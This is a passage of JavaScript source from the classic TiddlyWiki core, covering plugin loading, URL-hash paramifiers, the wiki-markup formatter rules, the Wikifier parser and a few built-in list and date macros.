		var reqs = p.Requires;
		if(reqs) {
			reqs = reqs.readBracketedList();
			for(var i=0; i<reqs.length; i++)
				visit(map[reqs[i]]);
		}
		toLoad.push(p);
	};
	for(i=0; i<nPlugins; i++) 
		visit(installedPlugins[i]);	
	for(i=0; i<toLoad.length; i++) {
		p = toLoad[i];
		pluginInfo = p;
		tiddler = p.tiddler;
		if(isPluginExecutable(p)) {
			if(isPluginEnabled(p)) {
				p.executed = true;
				var startTime = new Date();
				try {
					if(tiddler.text)
						window.eval(tiddler.text);
					nLoaded++;
				} catch(ex) {
					p.log.push(config.messages.pluginError.format([exceptionText(ex)]));
					p.error = true;
				}
				pluginInfo.startupTime = String((new Date()) - startTime) + "ms"; 
			} else {
				nPlugins--;
			}
		} else {
			p.warning = true;
		}
	}
	return nLoaded != nPlugins;
}

function getPluginInfo(tiddler)
{
	var p = store.getTiddlerSlices(tiddler.title,["Name","Description","Version","Requires","CoreVersion","Date","Source","Author","License","Browsers"]);
	p.tiddler = tiddler;
	p.title = tiddler.title;
	p.log = [];
	return p;
}

// Check that a particular plugin is valid for execution
function isPluginExecutable(plugin)
{
	if(plugin.tiddler.isTagged("systemConfigForce"))
		return verifyTail(plugin,true,config.messages.pluginForced);
	if(plugin["CoreVersion"]) {
		var coreVersion = plugin["CoreVersion"].split(".");
		var w = parseInt(coreVersion[0]) - version.major;
		if(w == 0 && coreVersion[1])
			w = parseInt(coreVersion[1]) - version.minor;
		if(w == 0 && coreVersion[2])
		 	w = parseInt(coreVersion[2]) - version.revision;
		if(w > 0)
			return verifyTail(plugin,false,config.messages.pluginVersionError);
		}
	return true;
}

function isPluginEnabled(plugin)
{
	if(plugin.tiddler.isTagged("systemConfigDisable"))
		return verifyTail(plugin,false,config.messages.pluginDisabled);
	return true;
}

function verifyTail(plugin,result,message)
{
	plugin.log.push(message);
	return result;
}

function invokeMacro(place,macro,params,wikifier,tiddler)
{
	try {
		var m = config.macros[macro];
		if(m && m.handler)
			m.handler(place,macro,params.readMacroParams(),wikifier,params,tiddler);
		else
			createTiddlyError(place,config.messages.macroError.format([macro]),config.messages.macroErrorDetails.format([macro,config.messages.missingMacro]));
	} catch(ex) {
		createTiddlyError(place,config.messages.macroError.format([macro]),config.messages.macroErrorDetails.format([macro,ex.toString()]));
	}
}

//--
//-- Paramifiers
//--

function getParameters()
{
	var p = null;
	if(window.location.hash) {
		p = decodeURI(window.location.hash.substr(1));
		if(config.browser.firefoxDate != null && config.browser.firefoxDate[1] < "20051111")
			p = convertUTF8ToUnicode(p);
	}
	return p;
}

function invokeParamifier(params,handler)
{
	if(!params || params.length == undefined || params.length <= 1)
		return;
	for(var t=1; t<params.length; t++) {
		var p = config.paramifiers[params[t].name];
		if(p && p[handler] instanceof Function)
			p[handler](params[t].value);
	}
}

config.paramifiers = {};

config.paramifiers.start = {
	oninit: function(v) {
		safeMode = v.toLowerCase() == "safe";
	}
};

config.paramifiers.open = {
	onstart: function(v) {
		story.displayTiddler("bottom",v,null,false,null);
	}
};

config.paramifiers.story = {
	onstart: function(v) {
		var list = store.getTiddlerText(v,"").parseParams("open",null,false);
		invokeParamifier(list,"onstart");
	}
};

config.paramifiers.search = {
	onstart: function(v) {
		story.search(v,false,false);
	}
};

config.paramifiers.searchRegExp = {
	onstart: function(v) {
		story.prototype.search(v,false,true);
	}
};

config.paramifiers.tag = {
	onstart: function(v) {
		var tagged = store.getTaggedTiddlers(v,"title");
		for(var t=0; t<tagged.length; t++)
			story.displayTiddler("bottom",tagged[t].title,null,false,null);
	}
};

config.paramifiers.newTiddler = {
	onstart: function(v) {
		if(!readOnly) {
			story.displayTiddler(null,v,DEFAULT_EDIT_TEMPLATE);
			story.focusTiddler(v,"text");
		}
	}
};

config.paramifiers.newJournal = {
	onstart: function(v) {
		if(!readOnly) {
			var now = new Date();
			var title = now.formatString(v.trim());
			story.displayTiddler(null,title,DEFAULT_EDIT_TEMPLATE);
			story.focusTiddler(title,"text");
		}
	}
};

config.paramifiers.readOnly = {
	onconfig: function(v) {
		var p = v.toLowerCase();
		readOnly = p == "yes" ? true : (p == "no" ? false : readOnly);
	}
};

//--
//-- Formatter helpers
//--

function Formatter(formatters)
{
	this.formatters = [];
	var pattern = [];
	for(var n=0; n<formatters.length; n++) {
		pattern.push("(" + formatters[n].match + ")");
		this.formatters.push(formatters[n]);
	}
	this.formatterRegExp = new RegExp(pattern.join("|"),"mg");
}

config.formatterHelpers = {

	createElementAndWikify: function(w)
	{
		w.subWikifyTerm(createTiddlyElement(w.output,this.element),this.termRegExp);
	},
	
	inlineCssHelper: function(w)
	{
		var styles = [];
		config.textPrimitives.cssLookaheadRegExp.lastIndex = w.nextMatch;
		var lookaheadMatch = config.textPrimitives.cssLookaheadRegExp.exec(w.source);
		while(lookaheadMatch && lookaheadMatch.index == w.nextMatch) {
			var s,v;
			if(lookaheadMatch[1]) {
				s = lookaheadMatch[1].unDash();
				v = lookaheadMatch[2];
			} else {
				s = lookaheadMatch[3].unDash();
				v = lookaheadMatch[4];
			}
			if (s=="bgcolor")
				s = "backgroundColor";
			styles.push({style: s, value: v});
			w.nextMatch = lookaheadMatch.index + lookaheadMatch[0].length;
			config.textPrimitives.cssLookaheadRegExp.lastIndex = w.nextMatch;
			lookaheadMatch = config.textPrimitives.cssLookaheadRegExp.exec(w.source);
		}
		return styles;
	},

	applyCssHelper: function(e,styles)
	{
		for(var t=0; t< styles.length; t++) {
			try {
				e.style[styles[t].style] = styles[t].value;
			} catch (ex) {
			}
		}
	},

	enclosedTextHelper: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			var text = lookaheadMatch[1];
			if(config.browser.isIE)
				text = text.replace(/\n/g,"\r");
			createTiddlyElement(w.output,this.element,null,null,text);
			w.nextMatch = lookaheadMatch.index + lookaheadMatch[0].length;
		}
	},

	isExternalLink: function(link)
	{
		if(store.tiddlerExists(link) || store.isShadowTiddler(link)) {
			return false;
		}
		var urlRegExp = new RegExp(config.textPrimitives.urlPattern,"mg");
		if(urlRegExp.exec(link)) {
			return true;
		}
		if (link.indexOf(".")!=-1 || link.indexOf("\\")!=-1 || link.indexOf("/")!=-1){
			return true;
		}
		return false;
	}

};

//--
//-- Standard formatters
//--

config.formatters = [
{
	name: "table",
	match: "^\\|(?:[^\\n]*)\\|(?:[fhck]?)$",
	lookaheadRegExp: /^\|([^\n]*)\|([fhck]?)$/mg,
	rowTermRegExp: /(\|(?:[fhck]?)$\n?)/mg,
	cellRegExp: /(?:\|([^\n\|]*)\|)|(\|[fhck]?$\n?)/mg,
	cellTermRegExp: /((?:\x20*)\|)/mg,
	rowTypes: {"c":"caption", "h":"thead", "":"tbody", "f":"tfoot"},

	handler: function(w)
	{
		var table = createTiddlyElement(w.output,"table",null,"twtable");
		var prevColumns = [];
		var currRowType = null;
		var rowContainer;
		var rowCount = 0;
		w.nextMatch = w.matchStart;
		this.lookaheadRegExp.lastIndex = w.nextMatch;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		while(lookaheadMatch && lookaheadMatch.index == w.nextMatch) {
			var nextRowType = lookaheadMatch[2];
			if(nextRowType == "k") {
				table.className = lookaheadMatch[1];
				w.nextMatch += lookaheadMatch[0].length+1;
			} else {
				if(nextRowType != currRowType) {
					rowContainer = createTiddlyElement(table,this.rowTypes[nextRowType]);
					currRowType = nextRowType;
				}
				if(currRowType == "c") {
					// Caption
					w.nextMatch++;
					if(rowContainer != table.firstChild)
						table.insertBefore(rowContainer,table.firstChild);
					rowContainer.setAttribute("align",rowCount == 0?"top":"bottom");
					w.subWikifyTerm(rowContainer,this.rowTermRegExp);
				} else {
					this.rowHandler(w,createTiddlyElement(rowContainer,"tr",null,(rowCount&1)?"oddRow":"evenRow"),prevColumns);
					rowCount++;
				}
			}
			this.lookaheadRegExp.lastIndex = w.nextMatch;
			lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		}
	},
	rowHandler: function(w,e,prevColumns)
	{
		var col = 0;
		var colSpanCount = 1;
		var prevCell = null;
		this.cellRegExp.lastIndex = w.nextMatch;
		var cellMatch = this.cellRegExp.exec(w.source);
		while(cellMatch && cellMatch.index == w.nextMatch) {
			if(cellMatch[1] == "~") {
				// Rowspan
				var last = prevColumns[col];
				if(last) {
					last.rowSpanCount++;
					last.element.setAttribute("rowspan",last.rowSpanCount);
					last.element.setAttribute("rowSpan",last.rowSpanCount); // Needed for IE
					last.element.valign = "center";
				}
				w.nextMatch = this.cellRegExp.lastIndex-1;
			} else if(cellMatch[1] == ">") {
				// Colspan
				colSpanCount++;
				w.nextMatch = this.cellRegExp.lastIndex-1;
			} else if(cellMatch[2]) {
				// End of row
				if(prevCell && colSpanCount > 1) {
					prevCell.setAttribute("colspan",colSpanCount);
					prevCell.setAttribute("colSpan",colSpanCount); // Needed for IE
				}
				w.nextMatch = this.cellRegExp.lastIndex;
				break;
			} else {
				// Cell
				w.nextMatch++;
				var styles = config.formatterHelpers.inlineCssHelper(w);
				var spaceLeft = false;
				var chr = w.source.substr(w.nextMatch,1);
				while(chr == " ") {
					spaceLeft = true;
					w.nextMatch++;
					chr = w.source.substr(w.nextMatch,1);
				}
				var cell;
				if(chr == "!") {
					cell = createTiddlyElement(e,"th");
					w.nextMatch++;
				} else {
					cell = createTiddlyElement(e,"td");
				}
				prevCell = cell;
				prevColumns[col] = {rowSpanCount:1,element:cell};
				if(colSpanCount > 1) {
					cell.setAttribute("colspan",colSpanCount);
					cell.setAttribute("colSpan",colSpanCount); // Needed for IE
					colSpanCount = 1;
				}
				config.formatterHelpers.applyCssHelper(cell,styles);
				w.subWikifyTerm(cell,this.cellTermRegExp);
				if(w.matchText.substr(w.matchText.length-2,1) == " ") // spaceRight
					cell.align = spaceLeft ? "center" : "left";
				else if(spaceLeft)
					cell.align = "right";
				w.nextMatch--;
			}
			col++;
			this.cellRegExp.lastIndex = w.nextMatch;
			cellMatch = this.cellRegExp.exec(w.source);
		}
	}
},

{
	name: "heading",
	match: "^!{1,6}",
	termRegExp: /(\n)/mg,
	handler: function(w)
	{
		w.subWikifyTerm(createTiddlyElement(w.output,"h" + w.matchLength),this.termRegExp);
	}
},

{
	name: "list",
	match: "^(?:[\\*#;:]+)",
	lookaheadRegExp: /^(?:(?:(\*)|(#)|(;)|(:))+)/mg,
	termRegExp: /(\n)/mg,
	handler: function(w)
	{
		var stack = [w.output];
		var currLevel = 0, currType = null;
		var listLevel, listType, itemType;
		w.nextMatch = w.matchStart;
		this.lookaheadRegExp.lastIndex = w.nextMatch;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		while(lookaheadMatch && lookaheadMatch.index == w.nextMatch) {
			if(lookaheadMatch[1]) {
				listType = "ul";
				itemType = "li";
			} else if(lookaheadMatch[2]) {
				listType = "ol";
				itemType = "li";
			} else if(lookaheadMatch[3]) {
				listType = "dl";
				itemType = "dt";
			} else if(lookaheadMatch[4]) {
				listType = "dl";
				itemType = "dd";
			}
			listLevel = lookaheadMatch[0].length;
			w.nextMatch += lookaheadMatch[0].length;
			var t;
			if(listLevel > currLevel) {
				for(t=currLevel; t<listLevel; t++) {
					var target = (currLevel == 0) ? stack[stack.length-1] : stack[stack.length-1].lastChild;
					stack.push(createTiddlyElement(target,listType));
				}
			} else if(listLevel < currLevel) {
				for(t=currLevel; t>listLevel; t--)
					stack.pop();
			} else if(listLevel == currLevel && listType != currType) {
				stack.pop();
				stack.push(createTiddlyElement(stack[stack.length-1].lastChild,listType));
			}
			currLevel = listLevel;
			currType = listType;
			var e = createTiddlyElement(stack[stack.length-1],itemType);
			w.subWikifyTerm(e,this.termRegExp);
			this.lookaheadRegExp.lastIndex = w.nextMatch;
			lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		}
	}
},

{
	name: "quoteByBlock",
	match: "^<<<\\n",
	termRegExp: /(^<<<(\n|$))/mg,
	element: "blockquote",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "quoteByLine",
	match: "^>+",
	lookaheadRegExp: /^>+/mg,
	termRegExp: /(\n)/mg,
	element: "blockquote",
	handler: function(w)
	{
		var stack = [w.output];
		var currLevel = 0;
		var newLevel = w.matchLength;
		var t;
		do {
			if(newLevel > currLevel) {
				for(t=currLevel; t<newLevel; t++)
					stack.push(createTiddlyElement(stack[stack.length-1],this.element));
			} else if(newLevel < currLevel) {
				for(t=currLevel; t>newLevel; t--)
					stack.pop();
			}
			currLevel = newLevel;
			w.subWikifyTerm(stack[stack.length-1],this.termRegExp);
			createTiddlyElement(stack[stack.length-1],"br");
			this.lookaheadRegExp.lastIndex = w.nextMatch;
			var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
			var matched = lookaheadMatch && lookaheadMatch.index == w.nextMatch;
			if(matched) {
				newLevel = lookaheadMatch[0].length;
				w.nextMatch += lookaheadMatch[0].length;
			}
		} while(matched);
	}
},

{
	name: "rule",
	match: "^----+$\\n?",
	handler: function(w)
	{
		createTiddlyElement(w.output,"hr");
	}
},

{
	name: "monospacedByLine",
	match: "^\\{\\{\\{\\n",
	lookaheadRegExp: /^\{\{\{\n((?:^[^\n]*\n)+?)(^\}\}\}$\n?)/mg,
	element: "pre",
	handler: config.formatterHelpers.enclosedTextHelper
},

{
	name: "monospacedByLineForCSS",
	match: "^/\\*\\{\\{\\{\\*/\\n",
	lookaheadRegExp: /\/\*\{\{\{\*\/\n*((?:^[^\n]*\n)+?)(\n*^\/\*\}\}\}\*\/$\n?)/mg,
	element: "pre",
	handler: config.formatterHelpers.enclosedTextHelper
},

{
	name: "monospacedByLineForPlugin",
	match: "^//\\{\\{\\{\\n",
	lookaheadRegExp: /^\/\/\{\{\{\n\n*((?:^[^\n]*\n)+?)(\n*^\/\/\}\}\}$\n?)/mg,
	element: "pre",
	handler: config.formatterHelpers.enclosedTextHelper
},

{
	name: "monospacedByLineForTemplate",
	match: "^<!--\\{\\{\\{-->\\n",
	lookaheadRegExp: /<!--\{\{\{-->\n*((?:^[^\n]*\n)+?)(\n*^<!--\}\}\}-->$\n?)/mg,
	element: "pre",
	handler: config.formatterHelpers.enclosedTextHelper
},

{
	name: "wikifyCommentForPlugin",
	match: "^/\\*\\*\\*\\n",
	termRegExp: /(^\*\*\*\/\n)/mg,
	handler: function(w)
	{
		w.subWikifyTerm(w.output,this.termRegExp);
	}
},

{
	name: "wikifyCommentForTemplate",
	match: "^<!---\\n",
	termRegExp: /(^--->\n)/mg,
	handler: function(w) 
	{
		w.subWikifyTerm(w.output,this.termRegExp);
	}
},

{
	name: "macro",
	match: "<<",
	lookaheadRegExp: /<<([^>\s]+)(?:\s*)((?:[^>]|(?:>(?!>)))*)>>/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart && lookaheadMatch[1]) {
			w.nextMatch = this.lookaheadRegExp.lastIndex;
			invokeMacro(w.output,lookaheadMatch[1],lookaheadMatch[2],w,w.tiddler);
		}
	}
},

{
	name: "prettyLink",
	match: "\\[\\[",
	lookaheadRegExp: /\[\[(.*?)(?:\|(~)?(.*?))?\]\]/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			var e;
			var text = lookaheadMatch[1];
			if(lookaheadMatch[3]) {
				// Pretty bracketted link
				var link = lookaheadMatch[3];
				e = (!lookaheadMatch[2] && config.formatterHelpers.isExternalLink(link)) ?
						createExternalLink(w.output,link) : createTiddlyLink(w.output,link,false,null,w.isStatic,w.tiddler);
			} else {
				// Simple bracketted link
				e = createTiddlyLink(w.output,text,false,null,w.isStatic,w.tiddler);
			}
			createTiddlyText(e,text);
			w.nextMatch = this.lookaheadRegExp.lastIndex;
		}
	}
},

{
	name: "unWikiLink",
	match: config.textPrimitives.unWikiLink+config.textPrimitives.wikiLink,
	handler: function(w)
	{
		w.outputText(w.output,w.matchStart+1,w.nextMatch);
	}
},

{
	name: "wikiLink",
	match: config.textPrimitives.wikiLink,
	handler: function(w)
	{
		if(w.matchStart > 0) {
			var preRegExp = new RegExp(config.textPrimitives.anyLetterStrict,"mg");
			preRegExp.lastIndex = w.matchStart-1;
			var preMatch = preRegExp.exec(w.source);
			if(preMatch.index == w.matchStart-1) {
				w.outputText(w.output,w.matchStart,w.nextMatch);
				return;
			}
		}
		if(w.autoLinkWikiWords == true || store.isShadowTiddler(w.matchText)) {
			var link = createTiddlyLink(w.output,w.matchText,false,null,w.isStatic,w.tiddler);
			w.outputText(link,w.matchStart,w.nextMatch);
		} else {
			w.outputText(w.output,w.matchStart,w.nextMatch);
		}
	}
},

{
	name: "urlLink",
	match: config.textPrimitives.urlPattern,
	handler: function(w)
	{
		w.outputText(createExternalLink(w.output,w.matchText),w.matchStart,w.nextMatch);
	}
},

{
	name: "image",
	match: "\\[[<>]?[Ii][Mm][Gg]\\[",
	lookaheadRegExp: /\[([<]?)(>?)[Ii][Mm][Gg]\[(?:([^\|\]]+)\|)?([^\[\]\|]+)\](?:\[([^\]]*)\])?\]/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			var e = w.output;
			if(lookaheadMatch[5]) {
				var link = lookaheadMatch[5];
				e = config.formatterHelpers.isExternalLink(link) ? createExternalLink(w.output,link) : createTiddlyLink(w.output,link,false,null,w.isStatic,w.tiddler);
				addClass(e,"imageLink");
			}
			var img = createTiddlyElement(e,"img");
			if(lookaheadMatch[1])
				img.align = "left";
			else if(lookaheadMatch[2])
				img.align = "right";
			if(lookaheadMatch[3])
				img.title = lookaheadMatch[3];
			img.src = lookaheadMatch[4];
			w.nextMatch = this.lookaheadRegExp.lastIndex;
		}
	}
},

{
	name: "html",
	match: "<[Hh][Tt][Mm][Ll]>",
	lookaheadRegExp: /<[Hh][Tt][Mm][Ll]>((?:.|\n)*?)<\/[Hh][Tt][Mm][Ll]>/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			createTiddlyElement(w.output,"span").innerHTML = lookaheadMatch[1];
			w.nextMatch = this.lookaheadRegExp.lastIndex;
		}
	}
},

{
	name: "commentByBlock",
	match: "/%",
	lookaheadRegExp: /\/%((?:.|\n)*?)%\//mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart)
			w.nextMatch = this.lookaheadRegExp.lastIndex;
	}
},

{
	name: "boldByChar",
	match: "''",
	termRegExp: /('')/mg,
	element: "strong",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "italicByChar",
	match: "//",
	termRegExp: /(\/\/)/mg,
	element: "em",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "underlineByChar",
	match: "__",
	termRegExp: /(__)/mg,
	element: "u",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "strikeByChar",
	match: "--(?!\\s|$)",
	termRegExp: /((?!\s)--|(?=\n\n))/mg,
	element: "strike",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "superscriptByChar",
	match: "\\^\\^",
	termRegExp: /(\^\^)/mg,
	element: "sup",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "subscriptByChar",
	match: "~~",
	termRegExp: /(~~)/mg,
	element: "sub",
	handler: config.formatterHelpers.createElementAndWikify
},

{
	name: "monospacedByChar",
	match: "\\{\\{\\{",
	lookaheadRegExp: /\{\{\{((?:.|\n)*?)\}\}\}/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			createTiddlyElement(w.output,"code",null,null,lookaheadMatch[1]);
			w.nextMatch = this.lookaheadRegExp.lastIndex;
		}
	}
},

{
	name: "styleByChar",
	match: "@@",
	termRegExp: /(@@)/mg,
	handler: function(w)
	{
		var e = createTiddlyElement(w.output,"span");
		var styles = config.formatterHelpers.inlineCssHelper(w);
		if(styles.length == 0)
			e.className = "marked";
		else
			config.formatterHelpers.applyCssHelper(e,styles);
		w.subWikifyTerm(e,this.termRegExp);
	}
},

{
	name: "lineBreak",
	match: "\\n|<br ?/?>",
	handler: function(w)
	{
		createTiddlyElement(w.output,"br");
	}
},

{
	name: "rawText",
	match: "\\\"{3}|<nowiki>",
	lookaheadRegExp: /(?:\"{3}|<nowiki>)((?:.|\n)*?)(?:\"{3}|<\/nowiki>)/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch && lookaheadMatch.index == w.matchStart) {
			createTiddlyElement(w.output,"span",null,null,lookaheadMatch[1]);
			w.nextMatch = this.lookaheadRegExp.lastIndex;
		}
	}
},

{
	name: "mdash",
	match: "--",
	handler: function(w)
	{
		createTiddlyElement(w.output,"span").innerHTML = "&mdash;";
	}
},

{
	name: "htmlEntitiesEncoding",
	match: "(?:(?:&#?[a-zA-Z0-9]{2,8};|.)(?:&#?(?:x0*(?:3[0-6][0-9a-fA-F]|1D[c-fC-F][0-9a-fA-F]|20[d-fD-F][0-9a-fA-F]|FE2[0-9a-fA-F])|0*(?:76[89]|7[7-9][0-9]|8[0-7][0-9]|761[6-9]|76[2-7][0-9]|84[0-3][0-9]|844[0-7]|6505[6-9]|6506[0-9]|6507[0-1]));)+|&#?[a-zA-Z0-9]{2,8};)",
	handler: function(w)
	{
		createTiddlyElement(w.output,"span").innerHTML = w.matchText;
	}
},

{
	name: "customClasses",
	match: "\\{\\{",
	termRegExp: /(\}\}\})/mg,
	lookaheadRegExp: /\{\{[\s]*([\w]+[\s\w]*)[\s]*\{(\n?)/mg,
	handler: function(w)
	{
		this.lookaheadRegExp.lastIndex = w.matchStart;
		var lookaheadMatch = this.lookaheadRegExp.exec(w.source);
		if(lookaheadMatch) {
			var e = createTiddlyElement(w.output,lookaheadMatch[2] == "\n" ? "div" : "span",null,lookaheadMatch[1]);
			w.nextMatch = this.lookaheadRegExp.lastIndex;
			w.subWikifyTerm(e,this.termRegExp);
		}
	}
}

];

//--
//-- Wikifier
//--

function getParser(tiddler,format)
{
	if(tiddler) {
		if(!format)
			format = tiddler.fields["wikiformat"];
		if(format) {
			for(var i in config.parsers) {
				if(format == config.parsers[i].format)
					return config.parsers[i];
			}
		} else {
			for(var i in config.parsers) {
				if(tiddler.isTagged(config.parsers[i].formatTag))
					return config.parsers[i];
			}
		}
	}
	return formatter;
}

function wikify(source,output,highlightRegExp,tiddler)
{
	if(source && source != "") {
		var wikifier = new Wikifier(source,getParser(tiddler),highlightRegExp,tiddler);
		wikifier.subWikifyUnterm(output);
	}
}

function wikifyStatic(source,highlightRegExp,tiddler,format)
{
	var e = createTiddlyElement(document.body,"div");
	e.style.display = "none";
	var html = "";
	if(source && source != "") {
		var wikifier = new Wikifier(source,getParser(tiddler,format),highlightRegExp,tiddler);
		wikifier.isStatic = true;
		wikifier.subWikifyUnterm(e);
		html = e.innerHTML;
		removeNode(e);
	}
	return html;
}

function wikifyPlain(title,theStore,limit)
{
	if(!theStore)
		theStore = store;
	if(theStore.tiddlerExists(title) || theStore.isShadowTiddler(title)) {
		return wikifyPlainText(theStore.getTiddlerText(title),limit,tiddler);
	} else {
		return "";
	}
}

function wikifyPlainText(text,limit,tiddler)
{
	if(limit > 0)
		text = text.substr(0,limit);
	var wikifier = new Wikifier(text,formatter,null,tiddler);
	return wikifier.wikifyPlain();
}

function highlightify(source,output,highlightRegExp,tiddler)
{
	if(source && source != "") {
		var wikifier = new Wikifier(source,formatter,highlightRegExp,tiddler);
		wikifier.outputText(output,0,source.length);
	}
}

function Wikifier(source,formatter,highlightRegExp,tiddler)
{
	this.source = source;
	this.output = null;
	this.formatter = formatter;
	this.nextMatch = 0;
	this.autoLinkWikiWords = tiddler && tiddler.autoLinkWikiWords() == false ? false : true;
	this.highlightRegExp = highlightRegExp;
	this.highlightMatch = null;
	this.isStatic = false;
	if(highlightRegExp) {
		highlightRegExp.lastIndex = 0;
		this.highlightMatch = highlightRegExp.exec(source);
	}
	this.tiddler = tiddler;
}

Wikifier.prototype.wikifyPlain = function()
{
	var e = createTiddlyElement(document.body,"div");
	this.subWikify(e);
	var text = getPlainText(e);
	removeNode(e);
	return text;
};

Wikifier.prototype.subWikify = function(output,terminator)
{
	if(terminator)
		this.subWikifyTerm(output,new RegExp("(" + terminator + ")","mg"));
	else
		this.subWikifyUnterm(output);
};

Wikifier.prototype.subWikifyUnterm = function(output)
{
	// subWikify() can be indirectly recursive, so we need to save the old output pointer
	var oldOutput = this.output;
	this.output = output;
	this.formatter.formatterRegExp.lastIndex = this.nextMatch;
	var formatterMatch = this.formatter.formatterRegExp.exec(this.source);
	while(formatterMatch) {
		// Output any text before the match
		if(formatterMatch.index > this.nextMatch)
			this.outputText(this.output,this.nextMatch,formatterMatch.index);
		// Set the match parameters for the handler
		this.matchStart = formatterMatch.index;
		this.matchLength = formatterMatch[0].length;
		this.matchText = formatterMatch[0];
		this.nextMatch = this.formatter.formatterRegExp.lastIndex;
		for(var t=1; t<formatterMatch.length; t++) {
			if(formatterMatch[t]) {
				this.formatter.formatters[t-1].handler(this);
				this.formatter.formatterRegExp.lastIndex = this.nextMatch;
				break;
			}
		}
		formatterMatch = this.formatter.formatterRegExp.exec(this.source);
	}
	if(this.nextMatch < this.source.length) {
		this.outputText(this.output,this.nextMatch,this.source.length);
		this.nextMatch = this.source.length;
	}
	this.output = oldOutput;
};

Wikifier.prototype.subWikifyTerm = function(output,terminatorRegExp)
{
	// subWikify() can be indirectly recursive, so we need to save the old output pointer
	var oldOutput = this.output;
	this.output = output;
	// Get the first matches for the formatter and terminator RegExps
	terminatorRegExp.lastIndex = this.nextMatch;
	var terminatorMatch = terminatorRegExp.exec(this.source);
	this.formatter.formatterRegExp.lastIndex = this.nextMatch;
	var formatterMatch = this.formatter.formatterRegExp.exec(terminatorMatch ? this.source.substr(0,terminatorMatch.index) : this.source);
	while(terminatorMatch || formatterMatch) {
		if(terminatorMatch && (!formatterMatch || terminatorMatch.index <= formatterMatch.index)) {
			if(terminatorMatch.index > this.nextMatch)
				this.outputText(this.output,this.nextMatch,terminatorMatch.index);
			this.matchText = terminatorMatch[1];
			this.matchLength = terminatorMatch[1].length;
			this.matchStart = terminatorMatch.index;
			this.nextMatch = this.matchStart + this.matchLength;
			this.output = oldOutput;
			return;
		}
		if(formatterMatch.index > this.nextMatch)
			this.outputText(this.output,this.nextMatch,formatterMatch.index);
		this.matchStart = formatterMatch.index;
		this.matchLength = formatterMatch[0].length;
		this.matchText = formatterMatch[0];
		this.nextMatch = this.formatter.formatterRegExp.lastIndex;
		for(var t=1; t<formatterMatch.length; t++) {
			if(formatterMatch[t]) {
				this.formatter.formatters[t-1].handler(this);
				this.formatter.formatterRegExp.lastIndex = this.nextMatch;
				break;
			}
		}
		terminatorRegExp.lastIndex = this.nextMatch;
		terminatorMatch = terminatorRegExp.exec(this.source);
		formatterMatch = this.formatter.formatterRegExp.exec(terminatorMatch ? this.source.substr(0,terminatorMatch.index) : this.source);
	}
	if(this.nextMatch < this.source.length) {
		this.outputText(this.output,this.nextMatch,this.source.length);
		this.nextMatch = this.source.length;
	}
	this.output = oldOutput;
};

Wikifier.prototype.outputText = function(place,startPos,endPos)
{
	while(this.highlightMatch && (this.highlightRegExp.lastIndex > startPos) && (this.highlightMatch.index < endPos) && (startPos < endPos)) {
		if(this.highlightMatch.index > startPos) {
			createTiddlyText(place,this.source.substring(startPos,this.highlightMatch.index));
			startPos = this.highlightMatch.index;
		}
		var highlightEnd = Math.min(this.highlightRegExp.lastIndex,endPos);
		var theHighlight = createTiddlyElement(place,"span",null,"highlight",this.source.substring(startPos,highlightEnd));
		startPos = highlightEnd;
		if(startPos >= this.highlightRegExp.lastIndex)
			this.highlightMatch = this.highlightRegExp.exec(this.source);
	}
	if(startPos < endPos) {
		createTiddlyText(place,this.source.substring(startPos,endPos));
	}
};

//--
//-- Macro definitions
//--

config.macros.today.handler = function(place,macroName,params)
{
	var now = new Date();
	var text;
	if(params[0])
		text = now.formatString(params[0].trim());
	else
		text = now.toLocaleString();
	createTiddlyElement(place,"span",null,null,text);
};

config.macros.version.handler = function(place)
{
	createTiddlyElement(place,"span",null,null,version.major + "." + version.minor + "." + version.revision + (version.beta ? " (beta " + version.beta + ")" : ""));
};

config.macros.list.handler = function(place,macroName,params)
{
	var type = params[0] ? params[0] : "all";
	var list = document.createElement("ul");
	place.appendChild(list);
	if(this[type].prompt)
		createTiddlyElement(list,"li",null,"listTitle",this[type].prompt);
	var results;
	if(this[type].handler)
		results = this[type].handler(params);
	for(var t = 0; t < results.length; t++) {
		var li = document.createElement("li");
		list.appendChild(li);
		createTiddlyLink(li,typeof results[t] == "string" ? results[t] : results[t].title,true);
	}
};

config.macros.list.all.handler = function(params)
{
	return store.reverseLookup("tags","excludeLists",false,"title");
};

config.macros.list.missing.handler = function(params)
{
	return store.getMissingLinks();
};

config.macros.list.orphans.handler = function(params)
{
	return store.getOrphans();
};

config.macros.list.shadowed.handler = function(params)
{
	return store.getShadowed();
};

